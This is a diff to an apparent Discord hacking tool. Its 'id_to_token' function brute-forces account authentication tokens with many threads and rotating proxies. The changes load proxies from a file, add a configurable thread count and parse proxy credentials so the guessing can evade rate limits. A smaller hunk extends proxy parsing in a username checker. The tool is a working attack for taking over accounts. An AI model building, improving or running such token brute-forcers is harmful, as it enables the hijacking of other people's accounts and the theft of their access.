@@ -64,26 +64,23 @@ def id_to_token():
         
         if use_proxies:
             proxy_type = get_inpt("Proxy Type (http/socks4/socks5):").lower() or "http"
-            print(Colorate.Horizontal(cl["num"], "  [>] Scraping proxies..."))
-            sources = [
-                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=yes&anonymity=all",
-                "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
-            ]
-            if proxy_type == "socks4":
-                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=yes&anonymity=all",
-                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"]
-            elif proxy_type == "socks5":
-                sources = ["https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=yes&anonymity=all",
-                           "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"]        
-            for url in sources:
-                try:
-                    resp = requests.get(url, timeout=6)
-                    if resp.status_code == 200:
-                        for line in resp.text.split("\n"):
-                            if ":" in line: proxies_list.append(line.strip())
-                except: pass
+            proxies_file = "input/proxies.txt"
+            if os.path.exists(proxies_file):
+                with open(proxies_file, "r", encoding="utf-8") as f:
+                    proxies_list = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            if not proxies_list:
+                print(Colorate.Horizontal(cl["num"], f"  [!] No proxies found in {proxies_file}."))
+                get_inpt("  Press Enter...")
+                return
             proxies_list = list(set(proxies_list))
-            print(Colorate.Horizontal(cl["head"], f"  [+] Loaded {len(proxies_list)} proxies."))
+            print(Colorate.Horizontal(cl["head"], f"  [+] Loaded {len(proxies_list)} proxies from {proxies_file}."))
+        
+        default_threads = 50 if use_proxies else 10
+        threads_inpt = get_inpt(f"Threads (default {default_threads}) [High threads at your own risk]: ")
+        try:
+            threads = int(threads_inpt) if threads_inpt else default_threads
+        except ValueError:
+            threads = default_threads
         
         chars = string.ascii_letters + string.digits + "-_"
         print(Colorate.Horizontal(cl["num"], "  [>] Starting brute force (Ctrl+C to stop)..."))
@@ -108,12 +105,25 @@ def id_to_token():
             }
             proxies_dict = None
             if proxy and use_proxies:
+                clean_proxy = proxy
+                for prefix in ["http://", "https://", "socks4://", "socks5://"]:
+                    if clean_proxy.lower().startswith(prefix):
+                        clean_proxy = clean_proxy[len(prefix):]
+                
+                parts = clean_proxy.split(":")
+                if len(parts) == 4:
+                    if parts[1].isdigit():
+                        ip, port, user, password = parts
+                    else:
+                        user, password, ip, port = parts
+                    clean_proxy = f"{user}:{password}@{ip}:{port}"
+
                 if proxy_type == "http":
-                    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                    proxies_dict = {"http": f"http://{clean_proxy}", "https": f"http://{clean_proxy}"}
                 elif proxy_type == "socks4":
-                    proxies_dict = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
+                    proxies_dict = {"http": f"socks4://{clean_proxy}", "https": f"socks4://{clean_proxy}"}
                 elif proxy_type == "socks5":
-                    proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
+                    proxies_dict = {"http": f"socks5://{clean_proxy}", "https": f"socks5://{clean_proxy}"}
             try:
                 response = requests.get(api_url, headers=headers, proxies=proxies_dict, timeout=3)
                 parts = guess.split('.')
@@ -147,7 +157,7 @@ def id_to_token():
                     print(Colorate.Horizontal(cl["head"], f"  [?] Attempt {attempts} | Error: {formatted_token}"))
                 return False
         try:
-            with ThreadPoolExecutor(max_workers=50 if use_proxies else 10) as executor:
+            with ThreadPoolExecutor(max_workers=threads) as executor:
                 futures = []
                 while not found:
                     p2 = ''.join(random.choices(chars, k=6))
@@ -158,7 +168,7 @@ def id_to_token():
                         proxy = random.choice(proxies_list)
                     future = executor.submit(check_token, guess, proxy)
                     futures.append(future)
-                    if len(futures) > 100:
+                    if len(futures) > threads * 2:
                         futures = [f for f in futures if not f.done()]
                     time.sleep(0.001)
                     
@@ -518,8 +528,9 @@ def discord_username_checker():
             def parse_proxy(proxy_str):
                 proxy_str = proxy_str.strip()
                 if not proxy_str: return None
-                if proxy_str.startswith("http://") or proxy_str.startswith("https://"):
-                    return {"http": proxy_str, "https": proxy_str}
+                for scheme in ["http://", "https://", "socks4://", "socks5://"]:
+                    if proxy_str.lower().startswith(scheme):
+                        return {"http": proxy_str, "https": proxy_str}
                 parts = proxy_str.split(":")
                 if len(parts) == 2:
                     url = f"http://{parts[0]}:{parts[1]}"
